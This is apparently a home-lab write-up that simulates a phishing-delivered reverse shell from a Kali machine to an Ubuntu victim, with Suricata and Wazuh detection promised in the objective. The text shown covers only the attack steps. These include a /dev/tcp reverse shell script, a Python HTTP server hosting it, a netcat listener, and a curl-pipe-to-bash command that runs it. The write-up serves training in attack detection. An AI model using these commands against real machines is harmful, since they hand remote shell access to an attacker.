
##  Objective

Simulate a **remote reverse shell attack** using a malicious Bash script and detect the activity using **Suricata** and **Wazuh** (configured on the victim machine).

---

## 🧪 Lab Setup

| Role     | Machine | IP Example         | Network Mode     |
|----------|---------|--------------------|------------------|
| Attacker | Kali    | `172.17.128.157`   | Bridged Adapter  |
| Victim   | Ubuntu  | `10.0.2.15`        | NAT              |

> 🔁 Different subnets simulate a remote attack scenario.

---

![Screenshot 2025-07-03 154733](https://github.com/user-attachments/assets/f6c9d61c-35ca-4374-a509-08248f474c39)

###  Step 1: Create Malicious Reverse Shell Script on Attacker

```bash
echo 'bash -i >& /dev/tcp/172.17.128.157/4444 0>&1' > rev.sh
chmod +x rev.sh
```

![image](https://github.com/user-attachments/assets/313a930c-5818-4495-9936-d449cde22c96)

### Step 2: Host the Script via HTTP Server

```bash
sudo python3 -m http.server 80
```
![image](https://github.com/user-attachments/assets/c8fe7502-8607-4d65-bd15-b13c638da700)

Script is now available at: `http://172.17.128.157/rev.sh`

### Step 3: Start Netcat Listener on Attacker

Take new terminal then type this command.

```bash
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/b75347ea-762c-491d-93d4-810d75947942)

This waits for the victim's reverse connection.

### Step 4: Simulate Victim Executing the One-Liner (Phishing)

 **Command:**
```bash
curl http://172.17.128.157/rev.sh | bash
```

 **What This Command Does**

This one-liner does two things in a chain:

---

 **1.** `curl http://172.17.128.157/rev.sh`  
`curl` is used to download a file (`rev.sh`) from the attacker's machine (`172.17.128.157`) over HTTP (port 80).

`rev.sh` is a malicious Bash script that contains a reverse shell payload:

```bash
bash -i >& /dev/tcp/172.17.128.157/4444 0>&1
```

---

 **2.** `| bash`  
The `|` (pipe) sends the contents of that downloaded script directly into `bash` for execution.

That means the victim doesn’t save the file or inspect it. It’s blindly executed.

---

In a real-world phishing attack, this would happen when the user clicks a button like:

🔧 *"Click here to install update!"*

---

 **What Is Being Simulated?**

You are simulating a phishing or social engineering attack, where the victim:

- Clicks a fake update link  
- Or opens a terminal and pastes a command suggested by an attacker (e.g., from fake IT support)  
- Or runs an “installer” that connects to the attacker  

---
but for now, we're running it manually on the victim to simulate the victim being tricked.

![image](https://github.com/user-attachments/assets/8b927f3c-9a24-4655-bbf9-d8d5eaf6fe4c)


Now go check if the reverse shell was successful on the attacker machine.


![image](https://github.com/user-attachments/assets/c97221d3-4c21-4dfa-ab8a-80913463265a)

successful .


